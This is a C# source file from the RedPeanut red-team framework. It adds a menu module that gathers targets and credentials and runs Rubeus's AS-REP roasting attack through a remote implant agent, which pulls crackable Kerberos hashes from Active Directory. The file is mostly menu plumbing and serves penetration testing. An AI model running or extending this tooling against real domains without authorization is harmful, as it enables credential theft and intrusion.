//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using System.Linq;
using static RedPeanut.Utility;

namespace RedPeanut
{
    class RubeusASREPRoastManager : IMenu
    {
        public static Dictionary<string, string> mainmenu = new Dictionary<string, string>
        {
            { "set user", "Set user" },
            { "set ou", "Set ou" },
            { "set outfile", "Set outfile" },
            { "set format", "Set outfile format" },
            { "set creduser", "Set cred user (DOMAIN.FQDN\\USER)" },
            { "set credpassword", "Set cred password" },
            { "set domain", "Set domain" },
            { "set dc", "Set set domain controller" },
            { "run", "Execute module" },
            { "options", "Print current config" },
            { "info", "Print help" },
            { "back", "Back to lateral menu" }
        };

        public void RePrintCLI()
        {
            Utility.RePrintCLI(agent, modulename);
            return;
        }

        IAgentInstance agent = null;
        string modulename = "asreproast";
        string user;
        string ou;
        string outfile;
        string format;
        string creduser;
        string credpassword;
        string domain;
        string dc;

        public RubeusASREPRoastManager()
        {

        }

        public RubeusASREPRoastManager(IAgentInstance agent)
        {
            this.agent = agent;
        }

        public void Execute()
        {
            string input;
            SetAutoCompletionHandler(mainmenu);
            do
            {
                input = RedPeanutCLI(agent, modulename);
                RubeusAskTgtMenu(input);
            } while (input != "back");
        }

        private void RubeusAskTgtMenu(string input)
        {
            string[] a_input = input.Split(' ');
            string f_input = ParseSelection(input);

            if (!string.IsNullOrEmpty(input))
            {
                if (mainmenu.ContainsKey(f_input.TrimEnd()))
                {
                    switch (f_input.TrimEnd())
                    {
                        case "set user":
                            user = GetParsedSetString(input);
                            break;
                        case "set ou":
                            ou = GetParsedSetString(input);
                            break;
                        case "set outfile":
                            outfile = GetParsedSetString(input);
                            break;
                        case "set format":
                            format = GetParsedSetString(input);
                            break;
                        case "set creduser":
                            creduser = GetParsedSetString(input);
                            break;
                        case "set credpassword":
                            credpassword = GetParsedSetString(input);
                            break;
                        case "set domain":
                            domain = GetParsedSetString(input);
                            break;
                        case "set dc":
                            dc = GetParsedSetString(input);
                            break;
                        case "run":
                            Run();
                            break;
                        case "options":
                            PrintCurrentConfig();
                            break;
                        case "info":
                            PrintOptions("info", mainmenu);
                            break;
                        case "back":
                            Program.GetMenuStack().Pop();
                            return;
                        default:
                            Console.WriteLine("We had a woodoo");
                            break;
                    }
                }
                else
                {
                    PrintOptions("Command not found", mainmenu);
                }
            }
        }
        
        private void Run()
        {
            List<string> args = new List<string>();
            args.Add("asreproast");

            if (!string.IsNullOrEmpty(user))
            {
                args.Add("/user:" + user);
            }

            if (!string.IsNullOrEmpty(ou))
            {
                args.Add("/ou:" + ou);
            }

            if (!string.IsNullOrEmpty(outfile))
            {
                args.Add("/outfile:" + outfile);
            }

            if (!string.IsNullOrEmpty(format))
            {
                args.Add("/format:" + format);
            }

            if (!string.IsNullOrEmpty(creduser))
            {
                args.Add("/creduser:" + creduser);
            }

            if (!string.IsNullOrEmpty(credpassword))
            {
                args.Add("/credpassword:" + credpassword);
            }

            if (!string.IsNullOrEmpty(domain))
            {
                args.Add("/domain:" + domain);
            }

            if (!string.IsNullOrEmpty(dc))
            {
                args.Add("/dc:" + dc);
            }

            RunAssembly(PL_MODULE_RUBEUS, "Rubeus.Program", args.ToArray<string>(), agent);

        }

        private void PrintCurrentConfig()
        {
            Dictionary<string, string> properties = new Dictionary<string, string>
            {
                { "user", user },
                { "ou", ou },
                { "outfile", outfile },
                { "format", format },
                { "creduser", creduser },
                { "credpassword", credpassword },
                { "domain", domain },
                { "dc", dc }
            };

            Utility.PrintCurrentConfig(modulename, properties);
        }
    }
}

